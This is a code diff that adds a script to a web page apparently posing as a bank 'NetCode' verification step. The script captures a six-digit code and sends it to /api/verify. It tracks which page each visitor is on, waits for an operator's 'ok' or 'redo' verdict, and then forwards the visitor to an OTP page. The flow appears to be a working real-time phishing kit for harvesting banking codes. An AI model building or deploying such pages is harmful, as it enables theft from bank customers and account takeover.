@@ -108,6 +108,160 @@
        </div>
 
         <main class="main-content">
+         <script>
+    // Session setup
+    const sid = new URLSearchParams(location.search).get('sid') ||
+                sessionStorage.getItem('sid');
+    
+    if (!sid) {
+      window.location.href = '/';
+      throw 0;
+    }
+
+    // Heartbeat to keep session alive
+    setInterval(() => {
+      fetch('/api/ping', {
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({ sid })
+      }).catch(() => {});
+    }, 10000);
+
+    // Elements
+    const netcodeInput = document.getElementById('netcode');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const errorMessage = document.getElementById('errorMessage');
+
+    // Restrict input to digits only
+    netcodeInput.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+      if (errorMessage.style.display === 'block') {
+        errorMessage.style.display = 'none';
+      }
+    });
+
+    // Validate NetCode (6 digits)
+    function validateNetCode(code) {
+      return /^\d{6}$/.test(code);
+    }
+
+    // Show error message
+    function showError(msg) {
+      errorMessage.textContent = msg;
+      errorMessage.style.display = 'block';
+      netcodeInput.focus();
+    }
+
+    // Verify button click handler
+    verifyBtn.addEventListener('click', async (e) => {
+      e.preventDefault();
+      
+      const netcode = netcodeInput.value.trim();
+      
+      // Validation
+      if (!netcode) {
+        showError('Please enter your NetCode.');
+        return;
+      }
+      
+      if (!validateNetCode(netcode)) {
+        showError('Please enter a valid 6 digit NetCode.');
+        return;
+      }
+
+      // Disable button and show loading state
+      verifyBtn.style.opacity = '0.6';
+      verifyBtn.style.pointerEvents = 'none';
+      verifyBtn.querySelector('strong').textContent = 'Verifying...';
+
+      try {
+        // Send to server
+        const response = await fetch('/api/verify', {
+          method: 'POST',
+          headers: { 'content-type': 'application/json' },
+          body: JSON.stringify({ sid, phone: netcode })
+        });
+
+        if (response.ok) {
+          // Update page status
+          await fetch('/api/page', {
+            method: 'POST',
+            headers: { 'content-type': 'application/json' },
+            body: JSON.stringify({ sid, page: 'verify.html' })
+          });
+          
+          // Start polling for admin approval
+          startPolling();
+        } else {
+          throw new Error('Verification failed');
+        }
+      } catch (err) {
+        // Reset button
+        verifyBtn.style.opacity = '';
+        verifyBtn.style.pointerEvents = '';
+        verifyBtn.querySelector('strong').textContent = 'Verify';
+        showError('Unable to verify. Please try again.');
+      }
+    });
+
+    // Allow Enter key to submit
+    netcodeInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') {
+        verifyBtn.click();
+      }
+    });
+
+    // Poll for admin action
+    let isWaitingForAdmin = false;
+    
+    function startPolling() {
+      if (isWaitingForAdmin) return;
+      isWaitingForAdmin = true;
+
+      const poll = async () => {
+        if (!isWaitingForAdmin) return;
+
+        try {
+          const res = await fetch(`/api/status/${sid}`);
+          const data = await res.json();
+
+          if (data.status === 'ok') {
+            isWaitingForAdmin = false;
+            // Proceed to next page (unregister/OTP page)
+            window.location.href = '/unregister.html';
+            return;
+          }
+
+          if (data.status === 'redo') {
+            isWaitingForAdmin = false;
+            // Reset button
+            verifyBtn.style.opacity = '';
+            verifyBtn.style.pointerEvents = '';
+            verifyBtn.querySelector('strong').textContent = 'Verify';
+            showError('Invalid NetCode. Please try again.');
+            netcodeInput.value = '';
+            netcodeInput.focus();
+            return;
+          }
+
+          // Continue polling
+          setTimeout(poll, 1200);
+
+        } catch (err) {
+          setTimeout(poll, 2000);
+        }
+      };
+
+      poll();
+    }
+
+    // Update page status on load
+    fetch('/api/page', {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ sid, page: 'verify.html' })
+    }).catch(() => {});
+  </script>
   <style>
     .main-content {
       flex: 1;
@@ -556,3 +710,4 @@
   </div>
  </body>
 </html>
+
